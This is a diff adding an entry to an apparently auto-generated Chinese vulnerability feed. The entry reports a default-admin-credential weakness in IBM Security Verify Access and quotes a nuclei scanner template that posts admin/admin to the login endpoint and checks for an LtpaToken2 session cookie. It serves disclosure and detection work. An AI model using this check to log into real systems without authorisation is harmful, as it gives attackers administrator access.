@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>IBM Security Verify Access 默认登录凭证漏洞</title>
+    <link href="/2025/06/11/github_1225078751/"/>
+    <url>/2025/06/11/github_1225078751/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> IBM Security Verify Access 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> IBM Security Verify Access 存在默认管理员凭证漏洞。未经身份验证的远程攻击者可利用此漏洞获取系统特权或管理员访问权限。</p><p><strong>产品厂商：</strong> IBM</p><p><strong>产品名称：</strong> IBM Security Verify Access</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/a4cf4c6d5775cd47dd60e0b6fc6d46344dc6f6fb/http%2Fdefault-logins%2Fibm%2Fibm-security-verify-access-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/a4cf4c6d5775cd47dd60e0b6fc6d46344dc6f6fb/http%2Fdefault-logins%2Fibm%2Fibm-security-verify-access-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> ibm-security-verify-access-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> IBM Security Verify Access Default Login<br>  <span class="hljs-params">author:</span> johnk3r<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> IBM Security Verify Access default admin credentials were discovered. An unauthenticated, remote attacker can exploit this gain privileged <span class="hljs-keyword">or</span> administrator access to the system.<br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:L<span class="hljs-operator">/</span>I:L<span class="hljs-operator">/</span>A:L<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">8.3</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">522</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">tags:</span> ibm,default-login<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/core/j_security_check</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">j_username</span><span class="hljs-operator">=</span>&#123;&#123;username&#125;&#125;&amp;j_password<span class="hljs-operator">=</span>&#123;&#123;password&#125;&#125;&amp;commit<span class="hljs-operator">=</span>&amp;locale<span class="hljs-operator">=</span>en&amp;_method<span class="hljs-operator">=</span>PUT<br><br>    <span class="hljs-params">attack:</span> pitchfork<br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">username:</span><br>        <span class="hljs-operator">-</span> admin<br>      <span class="hljs-params">password:</span><br>        <span class="hljs-operator">-</span> admin<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code == 302&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains(header, &#x27;Set-Cookie: LtpaToken2&#x27;)&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>projectdiscovery/nuclei-templates:github issues</tag>
+      
+      <tag>弱口令</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Bitbucket OAuth Credentials Exposure</title>
     <link href="/2025/06/11/github_4037177280/"/>
     <url>/2025/06/11/github_4037177280/</url>
